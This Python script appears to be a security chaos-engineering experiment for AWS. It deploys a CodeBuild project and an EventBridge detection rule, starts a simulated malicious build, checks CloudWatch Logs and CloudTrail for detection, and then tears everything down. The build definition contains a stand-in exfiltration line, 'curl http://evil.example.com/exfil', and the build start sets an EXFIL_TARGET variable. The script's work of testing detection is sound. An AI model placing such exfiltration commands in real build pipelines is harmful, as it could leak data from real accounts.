"""
SCE Experiment 1.8 - Detective Probe for Attack Node 1.7 (Start Malicious Build)

This experiment:
1. Creates a CodeBuild project and CloudWatch alarm/event rule to detect build starts
2. Attacks by starting a malicious build on the project
3. Verifies that the detective control (CloudTrail + CloudWatch Events) detected the build start
4. Rolls back all resources via CloudFormation
"""

import boto3
import json
import time
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

EXPERIMENT_NAME = "sce-1-8-detective"
TIMESTAMP = int(time.time())
STACK_NAME = f"{EXPERIMENT_NAME}-{TIMESTAMP}"
REGION = boto3.session.Session().region_name or "us-east-1"

# Global state to pass between phases
_state = {
    "stack_name": STACK_NAME,
    "project_name": f"malicious-build-target-{TIMESTAMP}",
    "build_id": None,
    "log_group_name": f"/aws/events/sce-malicious-build-{TIMESTAMP}",
    "rule_name": f"sce-detect-build-{TIMESTAMP}",
}


def _get_cfn_template():
    """Generate CloudFormation template for the experiment resources."""
    project_name = _state["project_name"]
    log_group_name = _state["log_group_name"]
    rule_name = _state["rule_name"]

    template = {
        "AWSTemplateFormatVersion": "2010-09-09",
        "Description": "SCE 1.8 - Detective control for malicious build detection",
        "Resources": {
            "CodeBuildServiceRole": {
                "Type": "AWS::IAM::Role",
                "Properties": {
                    "RoleName": f"sce-codebuild-role-{TIMESTAMP}",
                    "AssumeRolePolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Effect": "Allow",
                                "Principal": {"Service": "codebuild.amazonaws.com"},
                                "Action": "sts:AssumeRole"
                            }
                        ]
                    },
                    "Policies": [
                        {
                            "PolicyName": "CodeBuildMinimalPolicy",
                            "PolicyDocument": {
                                "Version": "2012-10-17",
                                "Statement": [
                                    {
                                        "Effect": "Allow",
                                        "Action": [
                                            "logs:CreateLogGroup",
                                            "logs:CreateLogStream",
                                            "logs:PutLogEvents"
                                        ],
                                        "Resource": "*"
                                    }
                                ]
                            }
                        }
                    ],
                    "Tags": [
                        {"Key": "Experiment", "Value": EXPERIMENT_NAME},
                        {"Key": "Timestamp", "Value": str(TIMESTAMP)}
                    ]
                }
            },
            "MaliciousBuildProject": {
                "Type": "AWS::CodeBuild::Project",
                "DependsOn": "CodeBuildServiceRole",
                "Properties": {
                    "Name": project_name,
                    "Description": "Target project for malicious build detection experiment",
                    "ServiceRole": {"Fn::GetAtt": ["CodeBuildServiceRole", "Arn"]},
                    "Artifacts": {"Type": "NO_ARTIFACTS"},
                    "Environment": {
                        "Type": "LINUX_CONTAINER",
                        "ComputeType": "BUILD_GENERAL1_SMALL",
                        "Image": "aws/codebuild/standard:5.0"
                    },
                    "Source": {
                        "Type": "NO_SOURCE",
                        "BuildSpec": "version: 0.2\nphases:\n  build:\n    commands:\n      - echo 'Malicious payload executed'\n      - curl http://evil.example.com/exfil || true\n"
                    },
                    "Tags": [
                        {"Key": "Experiment", "Value": EXPERIMENT_NAME},
                        {"Key": "Timestamp", "Value": str(TIMESTAMP)}
                    ]
                }
            },
            "DetectionLogGroup": {
                "Type": "AWS::Logs::LogGroup",
                "Properties": {
                    "LogGroupName": log_group_name,
                    "RetentionInDays": 1,
                    "Tags": [
                        {"Key": "Experiment", "Value": EXPERIMENT_NAME},
                        {"Key": "Timestamp", "Value": str(TIMESTAMP)}
                    ]
                }
            },
            "EventRuleRole": {
                "Type": "AWS::IAM::Role",
                "Properties": {
                    "RoleName": f"sce-events-role-{TIMESTAMP}",
                    "AssumeRolePolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Effect": "Allow",
                                "Principal": {"Service": "events.amazonaws.com"},
                                "Action": "sts:AssumeRole"
                            }
                        ]
                    },
                    "Policies": [
                        {
                            "PolicyName": "PutLogsPolicy",
                            "PolicyDocument": {
                                "Version": "2012-10-17",
                                "Statement": [
                                    {
                                        "Effect": "Allow",
                                        "Action": [
                                            "logs:CreateLogStream",
                                            "logs:PutLogEvents"
                                        ],
                                        "Resource": "*"
                                    }
                                ]
                            }
                        }
                    ],
                    "Tags": [
                        {"Key": "Experiment", "Value": EXPERIMENT_NAME},
                        {"Key": "Timestamp", "Value": str(TIMESTAMP)}
                    ]
                }
            },
            "BuildDetectionRule": {
                "Type": "AWS::Events::Rule",
                "DependsOn": ["DetectionLogGroup", "MaliciousBuildProject"],
                "Properties": {
                    "Name": rule_name,
                    "Description": "Detects CodeBuild StartBuild API calls for the experiment project",
                    "State": "ENABLED",
                    "EventPattern": json.dumps({
                        "source": ["aws.codebuild"],
                        "detail-type": ["CodeBuild Build State Change"],
                        "detail": {
                            "project-name": [project_name]
                        }
                    }),
                    "Targets": [
                        {
                            "Id": "LogTarget",
                            "Arn": {"Fn::Sub": f"arn:aws:logs:${{AWS::Region}}:${{AWS::AccountId}}:log-group:{log_group_name}"}
                        }
                    ]
                }
            },
            "LogGroupResourcePolicy": {
                "Type": "AWS::Logs::ResourcePolicy",
                "DependsOn": "DetectionLogGroup",
                "Properties": {
                    "PolicyName": f"sce-events-to-logs-{TIMESTAMP}",
                    "PolicyDocument": {
                        "Fn::Sub": json.dumps({
                            "Version": "2012-10-17",
                            "Statement": [
                                {
                                    "Sid": "AllowEventsToLogs",
                                    "Effect": "Allow",
                                    "Principal": {"Service": "events.amazonaws.com"},
                                    "Action": [
                                        "logs:CreateLogStream",
                                        "logs:PutLogEvents"
                                    ],
                                    "Resource": f"arn:aws:logs:${{AWS::Region}}:${{AWS::AccountId}}:log-group:{log_group_name}:*"
                                }
                            ]
                        })
                    }
                }
            }
        },
        "Outputs": {
            "ProjectName": {
                "Value": {"Ref": "MaliciousBuildProject"}
            },
            "DetectionRuleName": {
                "Value": {"Ref": "BuildDetectionRule"}
            },
            "LogGroupName": {
                "Value": {"Ref": "DetectionLogGroup"}
            }
        }
    }
    return json.dumps(template)


def _wait_for_stack(cfn_client, stack_name, desired_status, timeout=600):
    """Wait for CloudFormation stack to reach desired status."""
    start = time.monotonic()
    while time.monotonic() - start < timeout:
        try:
            response = cfn_client.describe_stacks(StackName=stack_name)
            status = response["Stacks"][0]["StackStatus"]
            logger.info(f"Stack {stack_name} status: {status}")
            if status == desired_status:
                return True
            if "FAILED" in status or "ROLLBACK_COMPLETE" == status:
                logger.error(f"Stack reached terminal failure state: {status}")
                # Get stack events for debugging
                try:
                    events = cfn_client.describe_stack_events(StackName=stack_name)
                    for event in events["StackEvents"][:10]:
                        if "FAILED" in event.get("ResourceStatus", ""):
                            logger.error(f"  Failed resource: {event['LogicalResourceId']} - {event.get('ResourceStatusReason', 'N/A')}")
                except Exception:
                    pass
                return False
        except cfn_client.exceptions.ClientError as e:
            if "does not exist" in str(e):
                if desired_status == "DELETE_COMPLETE":
                    return True
                return False
            raise
        time.sleep(15)
    logger.error(f"Timeout waiting for stack {stack_name} to reach {desired_status}")
    return False


def steady_state():
    """Deploy CloudFormation stack with CodeBuild project and detective controls."""
    logger.info(f"=== STEADY STATE: Deploying stack {STACK_NAME} ===")
    cfn_client = boto3.client("cloudformation", region_name=REGION)

    # Check if stack already exists
    try:
        response = cfn_client.describe_stacks(StackName=STACK_NAME)
        status = response["Stacks"][0]["StackStatus"]
        logger.warning(f"Stack {STACK_NAME} already exists with status: {status}")
        if status == "CREATE_COMPLETE" or status == "UPDATE_COMPLETE":
            logger.info("Stack is ready, continuing...")
            return True
        elif "IN_PROGRESS" in status:
            logger.info("Waiting for in-progress operation to complete...")
            _wait_for_stack(cfn_client, STACK_NAME, "CREATE_COMPLETE")
            return True
        elif status in ("ROLLBACK_COMPLETE", "DELETE_FAILED"):
            logger.info("Deleting failed stack before recreating...")
            cfn_client.delete_stack(StackName=STACK_NAME)
            _wait_for_stack(cfn_client, STACK_NAME, "DELETE_COMPLETE")
    except cfn_client.exceptions.ClientError as e:
        if "does not exist" not in str(e):
            raise

    # Create the stack
    template_body = _get_cfn_template()
    try:
        cfn_client.create_stack(
            StackName=STACK_NAME,
            TemplateBody=template_body,
            Capabilities=["CAPABILITY_NAMED_IAM"],
            Tags=[
                {"Key": "Experiment", "Value": EXPERIMENT_NAME},
                {"Key": "Timestamp", "Value": str(TIMESTAMP)}
            ]
        )
        logger.info(f"Stack creation initiated: {STACK_NAME}")
    except cfn_client.exceptions.AlreadyExistsException:
        logger.warning("Stack already exists (race condition), waiting for completion...")

    success = _wait_for_stack(cfn_client, STACK_NAME, "CREATE_COMPLETE")
    if not success:
        logger.error("Stack creation failed!")
        return False

    # Wait additional time for IAM role propagation
    logger.info("Waiting 15 seconds for IAM role propagation...")
    time.sleep(15)

    logger.info("Steady state established successfully.")
    return True


def attack():
    """Execute the attack: start a malicious build on the CodeBuild project."""
    logger.info("=== ATTACK: Starting Malicious Build ===")

    codebuild_client = boto3.client("codebuild", region_name=REGION)
    project_name = _state["project_name"]

    # Verify the project exists
    try:
        projects_response = codebuild_client.batch_get_projects(names=[project_name])
        if not projects_response.get("projects"):
            logger.error(f"Project {project_name} not found!")
            return False
        logger.info(f"Confirmed project exists: {project_name}")
    except Exception as e:
        logger.error(f"Error checking project: {e}")
        return False

    # Start the malicious build with suspicious environment variables
    try:
        response = codebuild_client.start_build(
            projectName=project_name,
            environmentVariablesOverride=[
                {
                    "name": "EXFIL_TARGET",
                    "value": "http://evil.example.com/data",
                    "type": "PLAINTEXT"
                },
                {
                    "name": "MALICIOUS_PAYLOAD",
                    "value": "base64encodedpayload",
                    "type": "PLAINTEXT"
                }
            ],
            buildspecOverride="version: 0.2\nphases:\n  build:\n    commands:\n      - echo 'MALICIOUS BUILD STARTED'\n      - echo 'Exfiltrating data...'\n"
        )

        build_id = response["build"]["id"]
        build_arn = response["build"]["arn"]
        http_status = response["ResponseMetadata"]["HTTPStatusCode"]

        _state["build_id"] = build_id
        logger.info(f"Malicious build started successfully!")
        logger.info(f"  Build ID: {build_id}")
        logger.info(f"  Build ARN: {build_arn}")
        logger.info(f"  HTTP Status: {http_status}")

        # Wait a moment for the event to propagate to CloudWatch Events
        logger.info("Waiting 30 seconds for event propagation to CloudWatch Logs...")
        time.sleep(30)

        return True

    except Exception as e:
        logger.error(f"Failed to start malicious build: {e}")
        return False


def hypothesis_verification():
    """
    Detective probe: Verify that the CloudWatch Events rule detected the malicious build start.
    
    Expected behavior: The EventBridge rule should have captured the CodeBuild Build State Change
    event and forwarded it to the CloudWatch Logs log group.
    """
    logger.info("=== HYPOTHESIS VERIFICATION: Checking detective control ===")

    logs_client = boto3.client("logs", region_name=REGION)
    events_client = boto3.client("events", region_name=REGION)
    log_group_name = _state["log_group_name"]
    rule_name = _state["rule_name"]
    project_name = _state["project_name"]
    build_id = _state.get("build_id")

    # Step 1: Verify the EventBridge rule exists and is active
    try:
        rule_response = events_client.describe_rule(Name=rule_name)
        rule_state = rule_response.get("State")
        logger.info(f"EventBridge rule '{rule_name}' state: {rule_state}")
        if rule_state != "ENABLED":
            logger.error("Detection rule is not enabled!")
            return False
    except Exception as e:
        logger.error(f"Failed to describe EventBridge rule: {e}")
        return False

    # Step 2: Check CloudWatch Logs for detection events with retries
    max_retries = 8
    retry_delay = 15
    detected = False

    for attempt in range(max_retries):
        logger.info(f"Checking log group for detection events (attempt {attempt + 1}/{max_retries})...")

        try:
            # Get log streams
            streams_response = logs_client.describe_log_streams(
                logGroupName=log_group_name,
                orderBy="LastEventTime",
                descending=True,
                limit=10
            )

            log_streams = streams_response.get("logStreams", [])
            if not log_streams:
                logger.info("No log streams found yet, waiting...")
                time.sleep(retry_delay)
                continue

            logger.info(f"Found {len(log_streams)} log stream(s)")

            # Check each log stream for events related to our build
            for stream in log_streams:
                stream_name = stream["logStreamName"]
                events_response = logs_client.get_log_events(
                    logGroupName=log_group_name,
                    logStreamName=stream_name,
                    startFromHead=True,
                    limit=50
                )

                for event in events_response.get("events", []):
                    message = event.get("message", "")
                    logger.info(f"Log event found: {message[:200]}...")

                    # Parse the event to check if it's about our project
                    try:
                        event_data = json.loads(message)
                        detail = event_data.get("detail", {})
                        event_project = detail.get("project-name", "")
                        build_status = detail.get("build-status", "")

                        if event_project == project_name:
                            logger.info(f"DETECTED: Build state change for project '{event_project}', status: '{build_status}'")
                            detected = True
                            break
                    except json.JSONDecodeError:
                        # Check as plain text
                        if project_name in message:
                            logger.info(f"DETECTED: Project name found in log event")
                            detected = True
                            break

                if detected:
                    break

            if detected:
                break

        except logs_client.exceptions.ResourceNotFoundException:
            logger.info("Log group not yet available, waiting...")
        except Exception as e:
            logger.error(f"Error querying logs: {e}")

        time.sleep(retry_delay)

    # Step 3: Additional verification - check CloudTrail for StartBuild event
    if not detected:
        logger.info("Checking CloudTrail for StartBuild API call as additional evidence...")
        cloudtrail_client = boto3.client("cloudtrail", region_name=REGION)

        try:
            # Look for StartBuild events in the last 10 minutes
            start_time = time.time() - 600
            trail_response = cloudtrail_client.lookup_events(
                LookupAttributes=[
                    {
                        "AttributeKey": "EventName",
                        "AttributeValue": "StartBuild"
                    }
                ],
                StartTime=start_time,
                MaxResults=20
            )

            for trail_event in trail_response.get("Events", []):
                cloud_trail_event = json.loads(trail_event.get("CloudTrailEvent", "{}"))
                request_params = cloud_trail_event.get("requestParameters", {})
                event_project = request_params.get("projectName", "")

                if event_project == project_name:
                    logger.info(f"DETECTED via CloudTrail: StartBuild for project '{event_project}'")
                    logger.info(f"  Event time: {trail_event.get('EventTime')}")
                    logger.info(f"  Event ID: {trail_event.get('EventId')}")
                    detected = True
                    break

        except Exception as e:
            logger.error(f"Error querying CloudTrail: {e}")

    if detected:
        logger.info("✅ HYPOTHESIS VERIFIED: Detective control successfully detected the malicious build start.")
        return True
    else:
        logger.error("❌ HYPOTHESIS FAILED: Detective control did not detect the malicious build start within the expected timeframe.")
        return False


def rollback():
    """Delete the CloudFormation stack and clean up all resources."""
    logger.info(f"=== ROLLBACK: Deleting stack {STACK_NAME} ===")
    cfn_client = boto3.client("cloudformation", region_name=REGION)
    codebuild_client = boto3.client("codebuild", region_name=REGION)

    # Stop any running builds first
    build_id = _state.get("build_id")
    if build_id:
        try:
            codebuild_client.stop_build(id=build_id)
            logger.info(f"Stopped build: {build_id}")
        except Exception as e:
            logger.warning(f"Could not stop build (may already be complete): {e}")

    # Delete the CloudFormation stack
    try:
        cfn_client.delete_stack(StackName=STACK_NAME)
        logger.info(f"Stack deletion initiated: {STACK_NAME}")
        success = _wait_for_stack(cfn_client, STACK_NAME, "DELETE_COMPLETE", timeout=600)
        if success:
            logger.info("Stack deleted successfully.")
        else:
            logger.error("Stack deletion may not have completed.")
    except cfn_client.exceptions.ClientError as e:
        if "does not exist" in str(e):
            logger.info("Stack does not exist, nothing to delete.")
        else:
            logger.error(f"Error deleting stack: {e}")

    # Clean up log group resource policy (these are account-level, not stack-managed sometimes)
    try:
        logs_client = boto3.client("logs", region_name=REGION)
        logs_client.delete_log_group(logGroupName=_state["log_group_name"])
        logger.info(f"Deleted log group: {_state['log_group_name']}")
    except Exception as e:
        logger.warning(f"Could not delete log group (may already be deleted): {e}")

    logger.info("Rollback complete.")
    return True


def run_experiment():
    """Run the full experiment end-to-end."""
    logger.info("=" * 60)
    logger.info(f"SCE Experiment 1.8 - Detective Probe for Malicious Build Start")
    logger.info(f"Stack Name: {STACK_NAME}")
    logger.info(f"Region: {REGION}")
    logger.info("=" * 60)

    try:
        # Phase 1: Steady State
        steady_result = steady_state()
        if not steady_result:
            logger.error("Steady state failed, aborting experiment.")
            return False

        # Phase 2: Attack
        attack_result = attack()
        if not attack_result:
            logger.error("Attack failed, but proceeding to verification.")

        # Phase 3: Hypothesis Verification
        verification_result = hypothesis_verification()

        logger.info("=" * 60)
        logger.info(f"EXPERIMENT RESULT: {'PASS' if verification_result else 'FAIL'}")
        logger.info("=" * 60)

        return verification_result

    finally:
        # Phase 4: Rollback (always)
        rollback()


if __name__ == "__main__":
    run_experiment()